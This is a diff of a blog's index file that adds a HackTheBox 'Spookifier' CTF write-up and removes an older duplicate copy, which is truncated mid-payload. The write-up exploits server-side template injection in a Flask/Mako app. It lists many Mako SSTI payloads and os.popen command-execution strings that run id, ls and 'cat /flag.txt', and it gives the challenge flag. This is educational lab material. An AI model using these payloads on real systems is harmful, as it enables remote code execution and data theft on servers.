@@ -165,6 +165,188 @@
       </tags>
   </entry>
   <entry>
+    <title>Spookifier</title>
+    <url>/2024/09/29/spookifier/</url>
+    <content><![CDATA[<p>Hello There! For today’s adventure we will be solving <code>Spookifier</code> from HackTheBox</p>
+<p><strong>Introduction:</strong></p>
+<p>SPOOKIFIER is an innovative tool that brings a touch of fright and fun to your digital content. It’s perfect for creating themed content, particularly around occasions like Halloween. With SPOOKIFIER, you can effortlessly transform your ordinary texts and graphics into spooky versions filled with ghostly charm. Get ready to spook your audience and bring a unique, eerie vibe to your digital creations.</p>
+<p><strong>Room Description:</strong> There’s a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/112m5rfqraqrhd14pmobp/1.png?rlkey=zg9qkz8eyytfzewvbzp3jdstf&st=ag86wfde&dl=0"
+                      alt="1.png"
+                ></p>
+<p><a class="link"   href="https://prod-files-secure.s3.us-west-2.amazonaws.com/d31c7c8c-5aa6-4285-9c64-ce0800706c95/9b7049c5-512e-4bf3-a3f2-a541429e1e2b/spookifier.zip" >spookifier.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>Downloading the zip file, It has the following contents</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/3c39br4bf8ezd77oe5flw/2.png?rlkey=8cclyosird4egk300rwgk4mfm&st=ahie949r&dl=0"
+                      alt="2.png"
+                ></p>
+<p>By going through the docker file , we can understand that we are installing flask_mako</p>
+<blockquote>
+<p><strong>Flask-Mako</strong> is a powerful tool for web developers working with Flask, a popular web framework in Python. As an extension, Flask-Mako serves as a bridge between Flask and the Mako templating engine. The Mako templating engine is designed to be fast and highly flexible, which makes it an excellent choice for generating dynamic HTML content. It offers the advantage of cleaner syntax compared to other templates and allows for complex templating scenarios. By using Flask-Mako, developers can use Mako’s syntax and functionality within their Flask applications. This includes features like template inheritance, filters, and the ability to embed raw Python code within templates. Moreover, Flask-Mako also facilitates easy management of static files such as CSS and JavaScript, which are crucial elements of any modern web application. In a nutshell, Flask-Mako brings the power and flexibility of Mako to Flask, making it simpler for developers to create dynamic, feature-rich web applications</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/lircd8an6q5nm1bkz6mtq/3.png?rlkey=8jq7j34xq8n3of2r79ukb8lo0&st=v64h66oi&dl=0"
+                      alt="3.png"
+                ></p>
+<p>Going through other files</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/29igy6a3bcndk6bw9xz8l/4.png?rlkey=94phqs15ysjw8yd5rqiogucms&st=2qxtfr6r&dl=0"
+                      alt="4.png"
+                ></p>
+<p>Config:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/2giuu4fk6b1fl436hn5sy/5.png?rlkey=zvr44ytapj2bfjculwjiwjdoa&st=47vtv7ps&dl=0"
+                      alt="5.png"
+                ></p>
+<p>Challenges application&#x2F;blueprints&#x2F;routes.py</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/zvpzr255umzrpteo18thr/6.png?rlkey=y4zq7wzz3viocgpymeuivo3c8&st=fgsj23o2&dl=0"
+                      alt="6.png"
+                ></p>
+<p>The static directory consisted of web template and all</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/y0wt7ql1g7t27kxe9ubkd/7.png?rlkey=mctekmiekrp59dtoz99am45v6&st=sy6idpbd&dl=0"
+                      alt="7.png"
+                ></p>
+<p>There is a main code in apllication</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify</span><br><span class="line"><span class="keyword">from</span> application.blueprints.routes <span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> flask_mako <span class="keyword">import</span> MakoTemplates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">MakoTemplates(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: message&#125;)</span><br><span class="line"></span><br><span class="line">app.register_blueprint(web, url_prefix=<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&#x27;404 Not Found&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&#x27;403 Forbidden&#x27;</span>), <span class="number">403</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">400</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bad_request</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&#x27;400 Bad Request&#x27;</span>), <span class="number">400</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>After going through lines of code , we can see tha6t everything goes through blueprint</p>
+<p>Now lets pay the site a little visit.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/r1aysqahgtwzmth1gd7q5/8.png?rlkey=ymhydg2tjabyguztm7qjx6p06&st=nhqhy0jy&dl=0"
+                      alt="8.png"
+                ></p>
+<p>Just for fun i entered name : wayne and here is the output I got</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/qsqo8a39cvq1vo1z2o8d0/9.png?rlkey=1kpjav4jradepkq5dbr2z67hd&st=29r6yedx&dl=0"
+                      alt="9.png"
+                ></p>
+<p>performing little recon on mako it shows that its vulnerable to serverside template injection</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/0s8k78s1ig0rsh7w2do6l/10.png?rlkey=4cwmlsanc3ohe5yj4r1u3fre2&st=xme6c9c8&dl=0"
+                      alt="10.png"
+                ></p>
+<p>So trying a sstl payload to check</p>
+<p>”36”</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/mcyz6ugldq2m7hbk8zhea/11.png?rlkey=905oorsz81xf2dywghtctez7g&st=a9k7wfkr&dl=0"
+                      alt="11.png"
+                ></p>
+<p>let’s try some available sstl payloads</p>
+<p>Before executing the payload , I tried retrieving the self object</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/ev5g8utey32ecklr5y2rt/12.png?rlkey=cywt80cxbnoy3qsyav1qhkgtr&st=ah9sp3hf&dl=0"
+                      alt="12.png"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/ev5g8utey32ecklr5y2rt/12.png?rlkey=cywt80cxbnoy3qsyav1qhkgtr&st=ah9sp3hf&dl=0"
+                      alt="13.png"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;self.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.**init**.**globals**[&#x27;util&#x27;].os.system(&#x27;id&#x27;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.**init**.**globals**[&#x27;os&#x27;].system(&#x27;id&#x27;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.util.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.context._with_template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Capture the packet using Burpsuite and send to repeater</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/awh8x685bx7st9efbq6nd/14-1.png?rlkey=cznnn50lugr8873c8p66u1bz2&st=l7v6ceh1&dl=0"
+                      alt="14.png"
+                ></p>
+<p>![[14 1.png]]</p>
+<p>Now use the payloads</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/qd3ihg9swspeg4w4rrge6/15-1.png?rlkey=0e9ew3wzggvwt507k05gvnf31&st=ozn0rw17&dl=0"
+                      alt="15.png"
+                ></p>
+<p>It just gave response with exit code “0”</p>
+<p>Since the above payloads returned nothing , lets try popen</p>
+<p>The code is available in <a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">x=os.popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line">%&gt;</span><br><span class="line">$&#123;x&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Now enter this in payload of burp packet</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%+x=self.module.runtime.util.os.popen(<span class="string">&#x27;id&#x27;</span>).<span class="built_in">read</span>()+%&gt;<span class="variable">$&#123;x&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Once you enter this you should be able to see the details of uid,gid , groups of the engine like the following</p>
+<p>Now alter the above to list the directories</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/k2277xnd7isp6rvyia0ed/17.png?rlkey=2bzcfkhuazpo08d8yi3tmbu2r&st=ndb54uxz&dl=0"
+                      alt="17.png"
+                ></p>
+<p>Now alter the above like the following to list the directories</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%+x=self.module.runtime.util.os.popen(<span class="string">&#x27;ls+-l&#x27;</span>).<span class="built_in">read</span>()+%&gt;<span class="variable">$&#123;x&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/e7wwb7s6c7wfy63odnac7/18.png?rlkey=79gmhb9r8laogk4sldqrqh2qw&st=daj21qy0&dl=0"
+                      alt="18.png"
+                ></p>
+<p>Now , since flag is located in the same directory</p>
+<p>alter the above payload into</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%+x=self.module.runtime.util.os.popen(<span class="string">&#x27;cat+/flag.txt&#x27;</span>).<span class="built_in">read</span>()+%&gt;<span class="variable">$&#123;x&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/e7wwb7s6c7wfy63odnac7/18.png?rlkey=79gmhb9r8laogk4sldqrqh2qw&st=daj21qy0&dl=0"
+                      alt="19.png"
+                ></p>
+<details>
+  <summary>Click to reveal the Flags</summary>
+  Flag: HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
+</details>
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://dl.dropbox.com/scl/fi/uwtmwkh48hy8b15ievfjf/19.png?rlkey=mxc9y9idxxp29fjicp1cu4bke&st=ed3avlvu&dl=0"
+                      alt="20.png"
+                ></p>
+<p><strong>Conclusion</strong></p>
+<p>The Spookifier lab is a beginner-friendly challenge that effectively demonstrates the basics of template injection exploitation. The walkthrough showcased the process clearly, making it ideal for practicing and understanding this common web application vulnerability. The room focuses more on identifying the vulnerability and crafting the payload rather than complex post-exploitation techniques.</p>
+<ul>
+<li>Exploiting a template injection vulnerability in a Flask application.</li>
+<li>Executing arbitrary code on the system using the vulnerability.</li>
+<li>Utilizing the <code>os.popen()</code> function to access and read the flag file.</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GoldenEye</title>
     <url>/2024/09/22/GoldenEye/</url>
     <content><![CDATA[<p>Greetings! Today, we will embark on a challenge by exploring a Capture the Flag (CTF) room on TryHackMe.</p>
@@ -487,188 +669,6 @@
 ]]></content>
       <tags>
         <tag>TryHackMe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>spookifier</title>
-    <url>/2024/09/29/spookifier/</url>
-    <content><![CDATA[<p>Hello There! For today’s adventure we will be solving <code>Bashed</code> from HackTheBox</p>
-<p><strong>Introduction:</strong></p>
-<p>SPOOKIFIER is an innovative tool that brings a touch of fright and fun to your digital content. It’s perfect for creating themed content, particularly around occasions like Halloween. With SPOOKIFIER, you can effortlessly transform your ordinary texts and graphics into spooky versions filled with ghostly charm. Get ready to spook your audience and bring a unique, eerie vibe to your digital creations.</p>
-<p><strong>Room Description:</strong> There’s a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/112m5rfqraqrhd14pmobp/1.png?rlkey=zg9qkz8eyytfzewvbzp3jdstf&st=ag86wfde&dl=0"
-                      alt="1.png"
-                ></p>
-<p><a class="link"   href="https://prod-files-secure.s3.us-west-2.amazonaws.com/d31c7c8c-5aa6-4285-9c64-ce0800706c95/9b7049c5-512e-4bf3-a3f2-a541429e1e2b/spookifier.zip" >spookifier.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p>Downloading the zip file, It has the following contents</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/3c39br4bf8ezd77oe5flw/2.png?rlkey=8cclyosird4egk300rwgk4mfm&st=ahie949r&dl=0"
-                      alt="2.png"
-                ></p>
-<p>By going through the docker file , we can understand that we are installing flask_mako</p>
-<blockquote>
-<p><strong>Flask-Mako</strong> is a powerful tool for web developers working with Flask, a popular web framework in Python. As an extension, Flask-Mako serves as a bridge between Flask and the Mako templating engine. The Mako templating engine is designed to be fast and highly flexible, which makes it an excellent choice for generating dynamic HTML content. It offers the advantage of cleaner syntax compared to other templates and allows for complex templating scenarios. By using Flask-Mako, developers can use Mako’s syntax and functionality within their Flask applications. This includes features like template inheritance, filters, and the ability to embed raw Python code within templates. Moreover, Flask-Mako also facilitates easy management of static files such as CSS and JavaScript, which are crucial elements of any modern web application. In a nutshell, Flask-Mako brings the power and flexibility of Mako to Flask, making it simpler for developers to create dynamic, feature-rich web applications</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/lircd8an6q5nm1bkz6mtq/3.png?rlkey=8jq7j34xq8n3of2r79ukb8lo0&st=v64h66oi&dl=0"
-                      alt="3.png"
-                ></p>
-<p>Going through other files</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/29igy6a3bcndk6bw9xz8l/4.png?rlkey=94phqs15ysjw8yd5rqiogucms&st=2qxtfr6r&dl=0"
-                      alt="4.png"
-                ></p>
-<p>Config:</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/2giuu4fk6b1fl436hn5sy/5.png?rlkey=zvr44ytapj2bfjculwjiwjdoa&st=47vtv7ps&dl=0"
-                      alt="5.png"
-                ></p>
-<p>Challenges application&#x2F;blueprints&#x2F;routes.py</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/zvpzr255umzrpteo18thr/6.png?rlkey=y4zq7wzz3viocgpymeuivo3c8&st=fgsj23o2&dl=0"
-                      alt="6.png"
-                ></p>
-<p>The static directory consisted of web template and all</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/y0wt7ql1g7t27kxe9ubkd/7.png?rlkey=mctekmiekrp59dtoz99am45v6&st=sy6idpbd&dl=0"
-                      alt="7.png"
-                ></p>
-<p>There is a main code in apllication</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify</span><br><span class="line"><span class="keyword">from</span> application.blueprints.routes <span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> flask_mako <span class="keyword">import</span> MakoTemplates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">MakoTemplates(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response</span>(<span class="params">message</span>):</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: message&#125;)</span><br><span class="line"></span><br><span class="line">app.register_blueprint(web, url_prefix=<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&#x27;404 Not Found&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&#x27;403 Forbidden&#x27;</span>), <span class="number">403</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">400</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bad_request</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> response(<span class="string">&#x27;400 Bad Request&#x27;</span>), <span class="number">400</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<p>After going through lines of code , we can see tha6t everything goes through blueprint</p>
-<p>Now lets pay the site a little visit.</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/r1aysqahgtwzmth1gd7q5/8.png?rlkey=ymhydg2tjabyguztm7qjx6p06&st=nhqhy0jy&dl=0"
-                      alt="8.png"
-                ></p>
-<p>Just for fun i entered name : wayne and here is the output I got</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/qsqo8a39cvq1vo1z2o8d0/9.png?rlkey=1kpjav4jradepkq5dbr2z67hd&st=29r6yedx&dl=0"
-                      alt="9.png"
-                ></p>
-<p>performing little recon on mako it shows that its vulnerable to serverside template injection</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/qsqo8a39cvq1vo1z2o8d0/9.png?rlkey=1kpjav4jradepkq5dbr2z67hd&st=29r6yedx&dl=0"
-                      alt="10.png"
-                ></p>
-<p>So trying a sstl payload to check</p>
-<p>”36”</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/mcyz6ugldq2m7hbk8zhea/11.png?rlkey=905oorsz81xf2dywghtctez7g&st=a9k7wfkr&dl=0"
-                      alt="11.png"
-                ></p>
-<p>let’s try some available sstl payloads</p>
-<p>Before executing the payload , I tried retrieving the self object</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/ev5g8utey32ecklr5y2rt/12.png?rlkey=cywt80cxbnoy3qsyav1qhkgtr&st=ah9sp3hf&dl=0"
-                      alt="12.png"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://dl.dropbox.com/scl/fi/ev5g8utey32ecklr5y2rt/12.png?rlkey=cywt80cxbnoy3qsyav1qhkgtr&st=ah9sp3hf&dl=0"
-                      alt="13.png"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;self.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.**init**.**globals**[&#x27;util&#x27;].os.system(&#x27;id&#x27;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.**init**.**globals**[&#x27;os&#x27;].system(&#x27;id&#x27;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.cache.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template._mmarker.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.cache.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.filters.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.compat.inspect.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.template.module.runtime.exceptions.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span class="variable">$&#123;self.attr._NSAttr__parent.module.runtime.util.os.system(&quot;id&quot;)&#125;</span></span><br><span class="line"><span 